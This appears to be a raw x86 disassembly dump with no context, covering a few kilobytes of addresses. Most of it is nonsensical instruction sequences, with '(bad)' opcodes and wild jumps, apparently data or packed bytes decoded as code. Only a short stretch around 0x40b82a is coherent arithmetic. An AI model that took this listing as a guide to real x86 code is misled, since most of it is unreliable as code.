  40b1d7:	ret    0x1887
  40b1da:	scas   eax,DWORD PTR es:[edi]
  40b1db:	cdq    
  40b1dc:	mov    ebp,0xc4bd3f4d
  40b1e1:	cmc    
  40b1e2:	add    al,0x0
  40b1e4:	inc    eax
  40b1e5:	ins    DWORD PTR es:[edi],dx
  40b1e6:	jo     0x40b191
  40b1e8:	jecxz  0x40b20f
  40b1ea:	push   ebx
  40b1eb:	into   
  40b1ec:	or     al,0x28
  40b1ee:	pop    ebp
  40b1ef:	xchg   DWORD PTR [esi],edx
  40b1f1:	sbb    edi,edi
  40b1f3:	push   edi
  40b1f4:	xchg   ecx,eax
  40b1f5:	popa   
  40b1f6:	cmp    al,BYTE PTR [esi+0x59]
  40b1f9:	outs   dx,DWORD PTR ds:[esi]
  40b1fa:	mov    esp,0xb341302f
  40b1ff:	into   
  40b200:	addr16 cld 
  40b202:	cmp    BYTE PTR [eax],0xdd
  40b205:	test   eax,0xd8316f
  40b20a:	mov    eax,0xbf00136b
  40b20f:	cmp    esi,edx
  40b211:	out    dx,al
  40b212:	and    eax,0xd17815e8
  40b217:	outs   dx,DWORD PTR ds:[esi]
  40b218:	push   edx
  40b219:	push   0x73c1ba78
  40b21e:	sub    BYTE PTR [esi+0x390bb295],al
  40b224:	xchg   esi,eax
  40b225:	mov    al,ds:0x1c784832
  40b22a:	cmp    bl,BYTE PTR [edx]
  40b22c:	cmp    DWORD PTR [ecx+0x4e],esi
  40b22f:	push   es
  40b230:	sbb    eax,0x4fdee624
  40b235:	(bad)
  40b23a:	jecxz  0x40b1ee
  40b23c:	and    DWORD PTR [ebx-0x195beca0],edi
  40b242:	scas   al,BYTE PTR es:[edi]
  40b243:	out    0x43,eax
  40b245:	cmp    cl,cl
  40b247:	mov    bh,0xe0
  40b249:	inc    ebp
  40b24a:	add    eax,0x1db84495
  40b24f:	test   DWORD PTR [edx],ebp
  40b251:	scas   al,BYTE PTR es:[edi]
  40b252:	aam    0xa8
  40b254:	xor    al,0xb1
  40b256:	not    ebx
  40b258:	pop    esi
  40b259:	repz imul ebx,DWORD PTR [edx],0x790c8d8a
  40b260:	xlat   BYTE PTR ds:[ebx]
  40b261:	icebp  
  40b262:	add    esi,edx
  40b264:	daa    
  40b265:	mov    al,0xc7
  40b267:	ror    dl,1
  40b269:	dec    BYTE PTR [ebx+0x45]
  40b26c:	jmp    0x40b22e
  40b26e:	or     eax,0xe0c72cef
  40b273:	add    BYTE PTR [ebx-0x52],bl
  40b276:	fstp   TBYTE PTR [ebx+0x7d]
  40b279:	add    al,0x9
  40b27b:	mov    bh,0x41
  40b27d:	adc    eax,0x60f8381b
  40b282:	mov    al,fs:0x6bd27b75
  40b288:	adc    eax,DWORD PTR [esi+edi*4]
  40b28b:	pop    esp
  40b28c:	dec    esi
  40b28d:	in     eax,0x65
  40b28f:	fistp  WORD PTR [ecx-0x66]
  40b292:	mov    edx,0xf2298bff
  40b297:	mov    al,0x50
  40b299:	fcom   DWORD PTR [eax+ecx*1]
  40b29c:	jns    0x40b31b
  40b29e:	pusha  
  40b29f:	int    0x29
  40b2a1:	push   0x72
  40b2a3:	call   0xe0bb87e1
  40b2a8:	add    BYTE PTR [ecx+0x302000b1],cl
  40b2ae:	push   eax
  40b2af:	cmp    eax,0x91a8f61b
  40b2b4:	repnz leave 
  40b2b6:	mov    bh,0x34
  40b2b8:	out    0x71,al
  40b2ba:	jae    0x40b2d0
  40b2bc:	daa    
  40b2bd:	ret    0xd5
  40b2c0:	loopne 0x40b298
  40b2c2:	xchg   edx,eax
  40b2c3:	lods   al,BYTE PTR ds:[esi]
  40b2c4:	xor    eax,0xda703168
  40b2c9:	sbb    DWORD PTR [esi+0x350eb914],ebx
  40b2cf:	adc    ah,BYTE PTR [ebx-0x62]
  40b2d2:	push   esi
  40b2d3:	icebp  
  40b2d4:	retf   
  40b2d5:	mov    bl,0xcb
  40b2d7:	or     BYTE PTR [ecx],0x21
  40b2da:	cwde   
  40b2db:	aas    
  40b2dc:	push   ebx
  40b2dd:	jno    0x40b34a
  40b2df:	sub    al,0x1
  40b2e1:	arpl   di,bp
  40b2e3:	gs fwait
  40b2e5:	inc    esp
  40b2e6:	cmc    
  40b2e7:	(bad)  
  40b2e8:	in     eax,0x8e
  40b2ea:	pop    edi
  40b2eb:	sti    
  40b2ec:	out    dx,al
  40b2ed:	dec    ebp
  40b2ee:	cmp    al,0xa6
  40b2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f1:	pop    edi
  40b2f2:	cli    
  40b2f3:	inc    esi
  40b2f4:	push   ebp
  40b2f5:	or     eax,0x29072e8b
  40b2fa:	sbb    BYTE PTR [esp+edi*8],0x8d
  40b2fe:	mov    edx,0x4fbec893
  40b303:	sbb    al,0xf6
  40b305:	aaa    
  40b306:	ret    0xb97f
  40b309:	xor    ebp,0xffffffb9
  40b30c:	fs enter 0x7b7d,0x91
  40b311:	push   ebp
  40b312:	sbb    BYTE PTR [edx],dh
  40b314:	dec    esi
  40b315:	push   0x590075bd
  40b31a:	add    ch,BYTE PTR [edi]
  40b31c:	aas    
  40b31d:	push   0x975b21b8
  40b322:	mov    esi,0xf8b9afb6
  40b327:	jmp    0xd41e59c3
  40b32c:	ss es cmp al,0x72
  40b331:	and    eax,0x3584b03f
  40b336:	push   edx
  40b337:	ss ds jp 0x40b2e2
  40b33b:	cld    
  40b33c:	aam    0x49
  40b33e:	fwait
  40b33f:	sbb    cl,0xc8
  40b342:	(bad)  
  40b343:	lea    esp,[eax]
  40b345:	mov    esp,0x45fd428a
  40b34a:	add    eax,0x7ddd8f06
  40b34f:	hlt    
  40b350:	pushw  cs
  40b352:	lea    esp,[edx]
  40b354:	ins    BYTE PTR es:[edi],dx
  40b355:	mov    ?,WORD PTR [edx+0x58]
  40b358:	push   es
  40b359:	jae    0x40b2ea
  40b35b:	cld    
  40b35c:	cmp    BYTE PTR [esi-0x32598b7e],0x80
  40b363:	inc    esp
  40b364:	or     DWORD PTR [ecx],esp
  40b366:	add    DWORD PTR [edx-0x52d6af90],edi
  40b36c:	ret    0x482f
  40b36f:	cmp    al,0x74
  40b371:	and    al,0x28
  40b373:	mov    al,ds:0xfa4e0791
  40b378:	bound  ebp,QWORD PTR [edi+edi*2]
  40b37b:	daa    
  40b37c:	pop    edi
  40b37d:	rcr    DWORD PTR [eax-0x7b],1
  40b380:	ss mov esp,gs
  40b383:	jnp    0x40b31f
  40b385:	xlat   BYTE PTR ds:[ebx]
  40b386:	or     ah,BYTE PTR [ebp+ecx*8+0x47d13a98]
  40b38d:	add    ah,BYTE PTR [ebx]
  40b38f:	lock loope 0x40b3ed
  40b392:	add    ecx,DWORD PTR [ebx]
  40b394:	dec    edi
  40b395:	sub    al,0x47
  40b397:	lds    ecx,FWORD PTR [ebp-0x6a]
  40b39a:	lds    eax,FWORD PTR [ecx]
  40b39c:	outs   dx,BYTE PTR ds:[esi]
  40b39d:	jbe    0x40b382
  40b39f:	je     0x40b39a
  40b3a1:	mov    ecx,DWORD PTR [edx-0x68f56949]
  40b3a7:	(bad)  
  40b3a8:	sbb    eax,DWORD PTR [edi+esi*8]
  40b3ab:	or     BYTE PTR [ebp-0x77],dh
  40b3ae:	dec    esp
  40b3af:	out    dx,eax
  40b3b0:	hlt    
  40b3b1:	outs   dx,BYTE PTR ds:[esi]
  40b3b2:	imul   esp,DWORD PTR ds:0xc4eec11b,0x9097cc31
  40b3bc:	(bad)  
  40b3bd:	mov    esp,0x18213742
  40b3c2:	test   BYTE PTR [ebp-0x35ff84ff],bl
  40b3c8:	ror    BYTE PTR [ebx+eiz*2-0x6b],0x24
  40b3cd:	push   eax
  40b3ce:	inc    esp
  40b3cf:	adc    BYTE PTR [ebp+ecx*2-0x8],ch
  40b3d3:	ins    DWORD PTR es:[edi],dx
  40b3d4:	xor    ah,BYTE PTR [eax]
  40b3d6:	jno    0x40b36f
  40b3d8:	mov    ds:0xa07cd896,eax
  40b3dd:	push   cs
  40b3de:	ret    0xd854
  40b3e1:	adc    cl,BYTE PTR [ebp+0x1fecf8f7]
  40b3e7:	cmp    al,0x5e
  40b3e9:	popf   
  40b3ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3eb:	add    BYTE PTR [ecx-0x3c],dh
  40b3ee:	xor    eax,0x44dcf928
  40b3f3:	dec    ebp
  40b3f4:	fldenv [edi+0x50]
  40b3f7:	sbb    al,0x0
  40b3f9:	(bad)  
  40b3fa:	mov    eax,0x6cf99cff
  40b3ff:	mov    eax,0x3bdf2bbb
  40b404:	fimul  DWORD PTR [edi]
  40b406:	xchg   DWORD PTR [edi],ebx
  40b408:	add    al,0x0
  40b40a:	add    BYTE PTR [ebx-0x58162bab],cl
  40b410:	or     BYTE PTR [eax],al
  40b412:	add    cl,ch
  40b414:	adc    al,BYTE PTR [eax+eax*1]
  40b417:	add    bl,dl
  40b419:	dec    edi
  40b41a:	int3   
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0xad
  40b425:	push   edx
  40b426:	in     eax,0x9
  40b428:	call   0x70bf32b3
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b447
  40b431:	nop
  40b432:	call   0x2bdad71e
  40b437:	and    eax,0xeffb4f64
  40b43c:	cmp    ebp,0xec4231ed
  40b442:	pop    esi
  40b443:	lahf   
  40b444:	loop   0x40b45c
  40b446:	push   ds
  40b447:	in     al,dx
  40b448:	jp     0x40b431
  40b44a:	lea    edi,[ecx-0x59]
  40b44d:	pusha  
  40b44e:	pop    esp
  40b44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b450:	sbb    ecx,DWORD PTR [ebp+0x3d302f25]
  40b456:	pop    eax
  40b457:	sbb    DWORD PTR [esi],0xfffffff7
  40b45a:	xor    eax,0x6688f29f
  40b45f:	inc    ecx
  40b460:	in     eax,0xf8
  40b462:	pop    ecx
  40b463:	jnp    0x40b482
  40b465:	lods   eax,DWORD PTR ds:[esi]
  40b466:	push   eax
  40b467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b468:	iret   
  40b469:	sbb    DWORD PTR [ecx+edi*4+0x6d7913c3],esp
  40b470:	dec    edx
  40b471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b472:	xlat   BYTE PTR ds:[ebx]
  40b473:	mov    BYTE PTR [ecx-0x4c311c53],bl
  40b479:	lods   eax,DWORD PTR ds:[esi]
  40b47a:	nop
  40b47b:	out    dx,eax
  40b47c:	shl    BYTE PTR [eax+0x5c],1
  40b47f:	cmp    eax,0xbb7d52b6
  40b484:	xor    DWORD PTR [ecx],edi
  40b486:	sbb    eax,0xc93021a9
  40b48b:	sub    al,0xf1
  40b48d:	(bad)  
  40b48f:	cmp    DWORD PTR [ecx+0x34],edi
  40b492:	jge    0x40b4ee
  40b494:	jl     0x40b483
  40b496:	js     0x40b42c
  40b498:	in     al,dx
  40b499:	xor    esp,DWORD PTR [eax]
  40b49b:	daa    
  40b49c:	mov    BYTE PTR [edx],0x87
  40b49f:	rol    BYTE PTR [esi-0x52],1
  40b4a2:	xor    BYTE PTR [eax+0x2d07a643],ch
  40b4a8:	imul   ebx,DWORD PTR [ebx+eax*8+0x78],0x21441062
  40b4b0:	cmp    dh,0xde
  40b4b3:	add    DWORD PTR [edx],ecx
  40b4b5:	mov    bl,0x34
  40b4b7:	adc    edx,DWORD PTR [eax+0x68d47eb0]
  40b4bd:	icebp  
  40b4be:	add    edi,edi
  40b4c0:	xchg   DWORD PTR [ebx-0x5],edi
  40b4c3:	add    cl,BYTE PTR ds:0xe69c4e2e
  40b4c9:	pop    ebp
  40b4ca:	test   DWORD PTR [ebx+0x126a6209],0x3c9270af
  40b4d4:	scas   eax,DWORD PTR es:[di]
  40b4d6:	pop    ebx
  40b4d7:	(bad)  
  40b4d8:	adc    eax,0xaca1865c
  40b4dd:	inc    ebp
  40b4de:	pop    ebp
  40b4df:	cmp    eax,0x7f951e8c
  40b4e4:	pop    ebx
  40b4e5:	loope  0x40b504
  40b4e7:	into   
  40b4e8:	xor    al,0x37
  40b4ea:	and    ebp,eax
  40b4ec:	push   edx
  40b4ed:	das    
  40b4ee:	mov    ah,0x47
  40b4f0:	scas   eax,DWORD PTR es:[edi]
  40b4f1:	jmp    0x40b494
  40b4f3:	aam    0x6
  40b4f5:	adc    al,0x6a
  40b4f7:	sbb    al,0x9f
  40b4f9:	ja     0x40b51c
  40b4fb:	rcl    esp,1
  40b4fd:	ret    
  40b4fe:	rol    ch,1
  40b500:	xchg   ecx,eax
  40b501:	arpl   WORD PTR [ecx-0x24],di
  40b504:	inc    edi
  40b505:	push   ds
  40b506:	sub    DWORD PTR [edi+ebx*1+0x496efc80],ebx
  40b50d:	mov    al,0xe
  40b50f:	xchg   ebx,eax
  40b510:	jo     0x40b494
  40b512:	gs aas 
  40b514:	jle    0x40b58d
  40b516:	push   ecx
  40b517:	fisttp QWORD PTR [ecx]
  40b519:	repz sbb bh,ah
  40b51c:	dec    eax
  40b51d:	add    bh,BYTE PTR [ebx]
  40b51f:	(bad)  
  40b520:	xchg   ecx,eax
  40b521:	or     BYTE PTR [esi+0x1c],bl
  40b524:	sbb    DWORD PTR [edi],esi
  40b526:	jle    0x40b4ef
  40b528:	pop    edi
  40b529:	pusha  
  40b52a:	inc    ebx
  40b52b:	fs fdivr st,st(5)
  40b52e:	adc    al,BYTE PTR [edi-0x1a10fce3]
  40b534:	lods   eax,DWORD PTR ds:[esi]
  40b535:	sub    DWORD PTR ds:0x35d833d2,ebp
  40b53b:	sub    al,0x7e
  40b53d:	xchg   ecx,eax
  40b53e:	test   eax,0xd593c4b2
  40b543:	ss cld 
  40b545:	out    0x1e,al
  40b547:	jl     0x40b5b1
  40b549:	pop    ebx
  40b54a:	pop    ds
  40b54b:	inc    esp
  40b54c:	or     ebp,esi
  40b54e:	mov    esi,0x2ce284ad
  40b553:	xor    eax,0x2f141fef
  40b558:	cld    
  40b559:	dec    ebx
  40b55a:	adc    al,0x28
  40b55c:	adc    al,0x14
  40b55e:	mov    al,0xcf
  40b560:	mov    eax,ds:0x9352405a
  40b565:	popa   
  40b566:	jmp    0x75f8:0x5aeb4b6f
  40b56d:	jno    0x40b5bc
  40b56f:	jno    0x40b59e
  40b571:	pop    ebp
  40b572:	or     eax,0xbca1ff95
  40b577:	frstor [ecx]
  40b579:	outs   dx,BYTE PTR ds:[esi]
  40b57a:	loope  0x40b594
  40b57c:	push   esp
  40b57d:	adc    al,0xd1
  40b57f:	sbb    bl,BYTE PTR [eax-0x42457b68]
  40b585:	mov    DWORD PTR [edx],0xcd72e75d
  40b58b:	ss addr16 mov dl,0x94
  40b58f:	and    DWORD PTR [eax],ebp
  40b591:	sbb    BYTE PTR [ebx+0x5f],dh
  40b594:	out    0xa4,al
  40b596:	xor    bl,ch
  40b598:	xchg   DWORD PTR [ebp+ebp*8+0x17],ebx
  40b59c:	jmp    0x85d5e3dc
  40b5a1:	pop    edi
  40b5a2:	jmp    0x40b581
  40b5a4:	add    al,0xa9
  40b5a6:	sub    eax,0xfd45782
  40b5ab:	mov    ds:0x6173b39,al
  40b5b0:	dec    ebp
  40b5b1:	out    0x36,eax
  40b5b3:	cdq    
  40b5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b5:	add    DWORD PTR [edi-0x1cda3838],ebx
  40b5bb:	lock inc eax
  40b5bd:	adc    eax,0xff43d60b
  40b5c2:	jbe    0x40b557
  40b5c4:	mov    dl,0x3c
  40b5c6:	xchg   edx,eax
  40b5c7:	outs   dx,BYTE PTR ds:[esi]
  40b5c8:	jno    0x40b589
  40b5ca:	int    0x7d
  40b5cc:	aad    0x6a
  40b5ce:	mov    esi,0x9c02e786
  40b5d3:	inc    esi
  40b5d4:	mov    ebp,0x35001a20
  40b5d9:	dec    ebx
  40b5da:	inc    esp
  40b5db:	mov    ah,0xb8
  40b5dd:	adc    ebx,DWORD PTR [ebx-0x2d9e89e3]
  40b5e3:	jp     0x40b5c6
  40b5e5:	or     al,0xeb
  40b5e7:	call   0x1e1c29bf
  40b5ec:	xor    al,0x7
  40b5ee:	mov    dh,0xe6
  40b5f0:	mov    dh,0x50
  40b5f2:	mov    ds:0xce0b6017,al
  40b5f7:	fild   WORD PTR [ebx-0x1c]
  40b5fa:	mov    WORD PTR [edi+0x6d],ds
  40b5fd:	cmp    esp,DWORD PTR [ecx-0x39]
  40b600:	outs   dx,BYTE PTR ds:[esi]
  40b601:	push   eax
  40b602:	test   eax,0x8c7f4d40
  40b607:	fmul   QWORD PTR [eax+0x1c]
  40b60a:	je     0x40b612
  40b60c:	push   es
  40b60d:	popa   
  40b60e:	cwde   
  40b60f:	sbb    esi,DWORD PTR [ebx]
  40b611:	xor    eax,0xd90ea655
  40b616:	shl    DWORD PTR [eax-0x52],cl
  40b619:	in     eax,dx
  40b61a:	mov    BYTE PTR [eax+edi*8],0x3a
  40b61e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b61f:	adc    al,0xf8
  40b621:	bnd jb 0x40b634
  40b624:	inc    ebp
  40b625:	xor    al,0x82
  40b627:	(bad)  
  40b628:	sbb    BYTE PTR [ecx-0x12],ah
  40b62b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b62c:	dec    edi
  40b62d:	popf   
  40b62e:	stos   BYTE PTR es:[edi],al
  40b62f:	cli    
  40b630:	mov    esp,0xf81846ac
  40b635:	xor    al,0x11
  40b637:	xor    BYTE PTR [eax-0x48bafa7c],bl
  40b63d:	out    dx,eax
  40b63e:	cmp    ah,BYTE PTR [edx-0x63]
  40b641:	sbb    DWORD PTR [edi+eiz*1],eax
  40b644:	add    eax,esp
  40b646:	dec    edi
  40b647:	dec    eax
  40b648:	mov    edi,0x8f8a7beb
  40b64d:	arpl   bx,ax
  40b64f:	jg     0x40b601
  40b651:	rcr    DWORD PTR [ecx],1
  40b653:	jno    0x40b60f
  40b655:	(bad)  
  40b656:	lds    ebp,FWORD PTR [eax+0x6b2243b9]
  40b65c:	lods   al,BYTE PTR ds:[esi]
  40b65d:	aas    
  40b65e:	fdivr  st(6),st
  40b660:	inc    ecx
  40b661:	mov    eax,0x28c599e0
  40b666:	push   ds
  40b667:	ins    DWORD PTR es:[edi],dx
  40b668:	outs   dx,BYTE PTR ds:[esi]
  40b669:	and    al,0xdc
  40b66b:	or     al,0x61
  40b66d:	ret    
  40b66e:	add    al,0x6
  40b670:	fsub   QWORD PTR [ecx+0x1e]
  40b673:	rcr    BYTE PTR [edx-0x5c],1
  40b676:	push   ebp
  40b677:	leave  
  40b678:	jno    0x40b6d7
  40b67a:	pop    ds
  40b67b:	xchg   edi,eax
  40b67c:	test   al,0x6b
  40b67e:	in     eax,dx
  40b67f:	dec    ebp
  40b680:	mov    esi,0x28b64002
  40b685:	jns    0x40b620
  40b687:	mov    eax,0x6a31dd28
  40b68c:	in     eax,dx
  40b68d:	enter  0x85e3,0x21
  40b691:	mov    ds:0x693f5d4e,al
  40b696:	or     al,BYTE PTR [eax]
  40b698:	xlat   BYTE PTR ds:[ebx]
  40b699:	call   0x60a8db8d
  40b69e:	mov    WORD PTR [ebx-0x69],cs
  40b6a1:	dec    edx
  40b6a2:	std    
  40b6a3:	sub    ah,BYTE PTR [ebx]
  40b6a5:	cwde   
  40b6a6:	jne    0x40b721
  40b6a8:	popf   
  40b6a9:	(bad)  
  40b6aa:	ins    DWORD PTR es:[edi],dx
  40b6ab:	dec    eax
  40b6ac:	push   ss
  40b6ad:	sbb    al,BYTE PTR [eax-0x64]
  40b6b0:	pusha  
  40b6b1:	xchg   ecx,eax
  40b6b2:	jl     0x662577de
  40b6b8:	test   al,0x13
  40b6ba:	push   cs
  40b6bb:	out    dx,al
  40b6bc:	daa    
  40b6bd:	mov    ebx,0x5a1d7cd0
  40b6c2:	loopne 0x40b67a
  40b6c4:	add    eax,0x1d78840a
  40b6c9:	cmp    ch,BYTE PTR [edx+0x27]
  40b6cc:	and    al,0x4
  40b6ce:	icebp  
  40b6cf:	sar    BYTE PTR [ebx-0x64],1
  40b6d2:	dec    esi
  40b6d3:	xchg   edx,eax
  40b6d4:	xlat   BYTE PTR ds:[ebx]
  40b6d5:	(bad)  
  40b6d6:	lods   eax,DWORD PTR ds:[esi]
  40b6d7:	(bad)  
  40b6d8:	fisubr WORD PTR [ebp+0x1f]
  40b6db:	mov    edi,DWORD PTR [esi-0x6a]
  40b6de:	jae    0x40b688
  40b6e0:	push   es
  40b6e1:	push   edx
  40b6e2:	pop    esi
  40b6e3:	out    0xfe,eax
  40b6e5:	lods   eax,DWORD PTR ds:[esi]
  40b6e6:	and    cl,BYTE PTR [esi+eiz*4+0x78]
  40b6ea:	in     eax,0xcd
  40b6ec:	mov    dh,0xfd
  40b6ee:	aaa    
  40b6ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6f0:	jno    0x40b6f7
  40b6f2:	push   ebx
  40b6f3:	sbb    al,0x30
  40b6f5:	cmp    eax,DWORD PTR [ebx]
  40b6f7:	pop    esp
  40b6f8:	(bad)  
  40b6f9:	sbb    edx,DWORD PTR [ebx]
  40b6fb:	lods   eax,DWORD PTR ds:[esi]
  40b6fc:	mov    ch,0xc2
  40b6fe:	mov    dl,0x35
  40b700:	ror    BYTE PTR [esi+0x64],1
  40b703:	lea    esi,[eax]
  40b705:	ror    DWORD PTR [ebp+0x25a55b12],0x4
  40b70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b70d:	std    
  40b70e:	push   ss
  40b70f:	loope  0x40b6e2
  40b711:	mov    edi,0x6d497f3d
  40b716:	and    ebp,esi
  40b718:	out    dx,al
  40b719:	jge    0x40b6e1
  40b71b:	and    edi,eax
  40b71d:	(bad)  
  40b71e:	mov    edi,0xfb94d19
  40b723:	imul   ecx,DWORD PTR [ecx],0xffffffa7
  40b726:	add    eax,0xb2181d1b
  40b72b:	xchg   DWORD PTR [eax+0x61],ebp
  40b72e:	fstp   TBYTE PTR [eax]
  40b730:	jge    0x40b77d
  40b732:	outs   dx,BYTE PTR ds:[esi]
  40b733:	pop    edx
  40b734:	push   ecx
  40b735:	sbb    ah,BYTE PTR [edx-0x403c5258]
  40b73b:	dec    eax
  40b73c:	iret   
  40b73d:	inc    eax
  40b73e:	pop    ss
  40b73f:	mov    BYTE PTR cs:[edx+0x7aa4a45b],ch
  40b746:	outs   dx,BYTE PTR ds:[esi]
  40b747:	je     0x40b7ad
  40b749:	hlt    
  40b74a:	out    dx,eax
  40b74b:	sbb    DWORD PTR [ebx],ebx
  40b74d:	es mov ch,0x5d
  40b750:	xchg   ebp,eax
  40b751:	fstp   TBYTE PTR [edi-0x1a]
  40b754:	(bad)  
  40b755:	mov    dh,0xd4
  40b757:	mov    esp,0xa0721ef6
  40b75c:	stos   BYTE PTR es:[edi],al
  40b75d:	sub    DWORD PTR [edi+0x3],edx
  40b760:	xchg   esp,eax
  40b761:	pop    esp
  40b762:	jne    0x40b748
  40b764:	dec    edx
  40b765:	mov    al,0x7
  40b767:	pop    edi
  40b768:	adc    bh,ch
  40b76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b76b:	loopne 0x40b719
  40b76d:	enter  0x8a5b,0xc5
  40b771:	mov    esi,ecx
  40b773:	inc    eax
  40b774:	or     ah,BYTE PTR [edi]
  40b776:	xchg   DWORD PTR [esi-0x6ba9a7f0],ebp
  40b77c:	retf   
  40b77d:	and    bh,BYTE PTR [edx+0x58]
  40b780:	test   BYTE PTR ds:0x79ba9967,bl
  40b786:	xchg   ebx,eax
  40b787:	inc    esp
  40b788:	das    
  40b789:	pop    edi
  40b78a:	out    dx,eax
  40b78b:	scas   eax,DWORD PTR es:[edi]
  40b78c:	shr    DWORD PTR [eax],cl
  40b78e:	jno    0x40b723
  40b790:	dec    edi
  40b791:	and    BYTE PTR [ebx-0x6b],ch
  40b794:	jno    0x40b7f2
  40b796:	mov    dh,0xf3
  40b798:	xor    al,0x7e
  40b79a:	pop    ecx
  40b79b:	mov    eax,?
  40b79d:	ret    
  40b79e:	push   edi
  40b79f:	outs   dx,DWORD PTR ds:[esi]
  40b7a0:	jg     0x40b7d3
  40b7a2:	fild   QWORD PTR [ecx]
  40b7a4:	mov    dh,0xb5
  40b7a6:	inc    ebx
  40b7a7:	xchg   ebp,eax
  40b7a8:	xchg   ecx,eax
  40b7a9:	sub    ch,BYTE PTR [edi]
  40b7ab:	dec    ebp
  40b7ac:	arpl   bx,bp
  40b7ae:	add    ah,BYTE PTR [edx]
  40b7b0:	retf   
  40b7b1:	loope  0x40b78b
  40b7b3:	ja     0x40b833
  40b7b5:	mov    ds:0xcc3f1d83,eax
  40b7ba:	sbb    ecx,DWORD PTR [ecx]
  40b7bc:	and    bh,ch
  40b7be:	jae    0x40b7c6
  40b7c0:	cmp    BYTE PTR [ebx+0x67398394],al
  40b7c6:	add    BYTE PTR [ebp+eax*4-0x736f4805],dh
  40b7cd:	jo     0x40b7e9
  40b7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7d0:	pop    ds
  40b7d1:	ins    DWORD PTR es:[edi],dx
  40b7d2:	out    0xa7,eax
  40b7d4:	mov    eax,0xb4732ff3
  40b7d9:	stos   DWORD PTR es:[edi],eax
  40b7da:	xchg   edi,eax
  40b7db:	inc    esp
  40b7dc:	or     BYTE PTR [ebp+0x4328e428],dh
  40b7e2:	or     esi,DWORD PTR [esi-0x3e]
  40b7e5:	(bad)  
  40b7e6:	outs   dx,BYTE PTR ds:[esi]
  40b7e7:	sbb    ah,BYTE PTR [edi+0x6f]
  40b7ea:	push   esi
  40b7eb:	dec    ebp
  40b7ec:	inc    eax
  40b7ed:	push   esi
  40b7ee:	inc    ecx
  40b7ef:	push   ebp
  40b7f0:	xor    BYTE PTR [edx+eax*4],0x85
  40b7f4:	sar    edi,cl
  40b7f6:	not    BYTE PTR [esi+0x33]
  40b7f9:	dec    DWORD PTR [eax-0x4b]
  40b7fc:	sbb    eax,0x963007cb
  40b801:	ins    DWORD PTR es:[edi],dx
  40b802:	out    0x6f,eax
  40b804:	mov    ecx,0x4e89abf6
  40b809:	mov    WORD PTR [ecx],?
  40b80b:	mov    edi,ss
  40b80d:	jle    0x40b855
  40b80f:	and    al,dh
  40b811:	and    ebp,eax
  40b813:	jp     0x40b87e
  40b815:	push   esp
  40b816:	sbb    DWORD PTR [esi-0x70],ecx
  40b819:	retf   0x1e14
  40b81c:	mov    ds:0x9e1ce2cb,eax
  40b821:	lea    ecx,[ecx+0x67e3453b]
  40b827:	add    DWORD PTR [ebx-0xf],ebp
  40b82a:	mov    edx,DWORD PTR [ebp-0x34]
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	jmp    0xe28b144f
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b850
  40b8b1:	je     0x40b85b
  40b8b3:	test   BYTE PTR [ecx-0x2],0xc4
  40b8b7:	xchg   esp,eax
  40b8b8:	sbb    DWORD PTR [edx-0x31],0x4583411e
  40b8bf:	out    0xc6,eax
  40b8c1:	(bad)  
  40b8c2:	jmp    0x1138:0xf44f0bdc
  40b8c9:	data16 (bad) 
  40b8cb:	pop    ds
  40b8cc:	aaa    
  40b8cd:	mov    ebx,0x2c4f8f78
  40b8d2:	sub    bl,BYTE PTR [edi+0x669e7a3b]
  40b8d8:	jecxz  0x40b94b
  40b8da:	fst    st(1)
  40b8dc:	fbstp  TBYTE PTR [esi+0x3e]
  40b8df:	jae    0x40b92d
  40b8e1:	xchg   BYTE PTR [edx-0x3765d6a6],ah
  40b8e7:	adc    BYTE PTR [esi-0x51],cl
  40b8ea:	leave  
  40b8eb:	imul   BYTE PTR [ecx+0x76]
